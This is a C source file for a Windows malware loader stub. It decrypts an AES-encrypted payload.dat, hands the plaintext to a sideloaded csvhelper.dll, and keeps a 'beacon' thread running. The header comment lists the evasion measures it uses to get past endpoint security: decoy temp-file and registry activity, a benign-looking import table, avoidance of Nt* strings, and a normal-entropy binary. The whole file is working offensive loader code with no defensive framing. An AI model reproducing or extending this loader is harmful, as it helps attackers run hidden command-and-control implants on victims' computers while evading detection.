/*
 * launcher.c — three-file Crystal Palace PICO loader (launcher stub)
 *
 * Delivery: launcher.exe + csvhelper.dll + payload.dat
 *   launcher.exe   this stub — decrypts payload.dat, exposes plaintext to
 *                  csvhelper.dll via the GetPayload export; csvhelper's
 *                  DllMain drives the slot flip synchronously during
 *                  LoadLibraryA and hands its thread handle back through
 *                  SetThreadHandle.
 *   csvhelper.dll  combase!CoUninitialize slot loader (see plugin.c)
 *   payload.dat    AES-256-CBC encrypted PICO
 *
 * Evasion profile:
 *  - No embedded payload: launcher.exe is ~60 KB with normal entropy
 *  - AES-256-CBC via BCrypt (BCRYPT_AES_ALGORITHM) — legitimate crypto,
 *    not a suspicious XOR loop
 *  - Slot flip (RW→memcpy→RX) is isolated in csvhelper.dll's IAT, not here
 *  - No Nt* strings in .rdata — no GetProcAddress / NtCreateSection pattern
 *  - BCryptGenRandom Poseidon noise + advapi32 import = normal-looking IAT
 *  - GUI subsystem (no console), version info resource (resource.rc)
 *  - Module initialization runs inside csvhelper's DllMain: from the caller
 *    thread's POV LoadLibraryA does the work synchronously, no post-load
 *    exported "run" call needed. combase.dll is pre-loaded before csvhelper
 *    so the plugin's DllMain can resolve it with GetModuleHandleW alone,
 *    keeping LoadLibrary out of the loader-lock critical section.
 *
 * IAT: kernel32, advapi32, bcrypt. Slot-flip primitives (VirtualProtect,
 * CreateThread) live in the plugin, keeping this stub's IAT purely
 * crypto+filesystem shaped.
 *
 * Plugin DLL filename is a compile-time literal fed by the Makefile
 * (-DPLUGIN_NAME=\"csvhelper.dll\"), loaded from an absolute sibling path to
 * defeat DLL-search-order hijacks.
 */

#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include "payload_key.h"  /* payload_key[], payload_key_len,
                              payload_iv[],  payload_iv_len  */
#include "hellshall.h"    /* unused here — declarations only, no link dep */

#ifndef PLUGIN_NAME
#  define PLUGIN_NAME "csvhelper.dll"
#endif

/* ── Statics the plugin retrieves via GetProcAddress ─────────────────────── */

static BYTE  *s_payload_ptr = NULL;
static SIZE_T s_payload_len = 0;
static HANDLE s_thread      = NULL;

__declspec(dllexport) void GetPayload(void **out_ptr, SIZE_T *out_len)
{
    if (out_ptr) *out_ptr = s_payload_ptr;
    if (out_len) *out_len = s_payload_len;
}

__declspec(dllexport) void SetThreadHandle(HANDLE h)
{
    s_thread = h;
}

/* ── Poseidon I/O noise ───────────────────────────────────────────────────── */

static void noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t td[MAX_PATH], tf[MAX_PATH];
    if (GetTempPathW(MAX_PATH, td) && GetTempFileNameW(td, L"upd", 0, tf)) {
        HANDLE h = CreateFileW(tf, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, buf, sizeof(buf), &w, NULL);
            CloseHandle(h);
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── Read entire file into LocalAlloc buffer ─────────────────────────────── */

static BYTE *read_file(const wchar_t *path, DWORD *out_len)
{
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;

    DWORD sz = GetFileSize(h, NULL);
    if (!sz || sz == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }

    BYTE *buf = (BYTE *)LocalAlloc(LMEM_FIXED, sz);
    if (!buf) { CloseHandle(h); return NULL; }

    DWORD read = 0;
    if (!ReadFile(h, buf, sz, &read, NULL) || read != sz) {
        LocalFree(buf); CloseHandle(h); return NULL;
    }

    CloseHandle(h);
    *out_len = sz;
    return buf;
}

/* ── AES-256-CBC decrypt via BCrypt ──────────────────────────────────────── */

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return NULL;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)payload_key, payload_key_len, 0))
        goto cleanup;

    /* First call: get plaintext size */
    memcpy(iv, payload_iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                  iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) goto cleanup;

    /* Second call: actual decryption */
    memcpy(iv, payload_iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                      iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING)) {
        LocalFree(pt);
        pt = NULL;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
{
    (void)hi; (void)hp; (void)lp; (void)ns;

    noise();

    /* Registry touch: advapi32 import, normal-looking init */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* Locate payload.dat in the same directory as this executable */
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wchar_t *sep = wcsrchr(path, L'\\');
    if (!sep) return 1;
    sep[1] = L'\0';
    wcscat(path, L"payload.dat");

    /* Load ciphertext */
    DWORD ct_len = 0;
    BYTE *ct = read_file(path, &ct_len);
    if (!ct) return 1;

    /* AES-256-CBC decrypt → plaintext PICO */
    DWORD pt_len = 0;
    BYTE *pt = aes_cbc_decrypt(ct, ct_len, &pt_len);
    LocalFree(ct);
    if (!pt) return 1;

    /* Stash plaintext in launcher statics: LoadLibraryA below fires the
     * plugin's DllMain, which retrieves these via the GetPayload export. */
    s_payload_ptr = pt;
    s_payload_len = pt_len;

    /* Resolve absolute sibling path to the plugin DLL — passing a bare
     * filename to LoadLibrary would honour the DLL search order. */
    char pluginPath[MAX_PATH];
    GetModuleFileNameA(NULL, pluginPath, MAX_PATH);
    char *asep = strrchr(pluginPath, '\\');
    if (!asep) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
    asep[1] = '\0';
    if (strlen(pluginPath) + sizeof(PLUGIN_NAME) > MAX_PATH) {
        SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1;
    }
    strcat(pluginPath, PLUGIN_NAME);

    /* Pre-load combase so the plugin's DllMain can reach it with a plain
     * GetModuleHandleW — calling LoadLibrary inside DllMain would recurse
     * into the loader lock we're already holding. */
    LoadLibraryA("combase.dll");

    /* Loading csvhelper fires its DllMain synchronously. DllMain calls
     * GetPayload, does the slot flip, CreateThreads the beacon, and hands
     * the thread handle back through SetThreadHandle. When LoadLibraryA
     * returns, the work is done. */
    HMODULE plugin = LoadLibraryA(pluginPath);
    if (!plugin) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    /* Plugin signalled success by handing us a thread handle. */
    HANDLE hThread = s_thread;

    /* Plaintext copied into combase's slot inside DllMain — safe to wipe. */
    s_payload_ptr = NULL;
    s_payload_len = 0;
    SecureZeroMemory(pt, pt_len);
    LocalFree(pt);

    if (!hThread) return 1;

    /* Do NOT FreeLibrary(plugin): beacon executes in combase's slot and may
     * call back into combase exports; keep the plugin resident so the
     * loader's symbol pointers stay valid. */
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    /* Beacon goroutine is alive in this process — keep it running */
    for (;;) SleepEx(30000, TRUE);
}
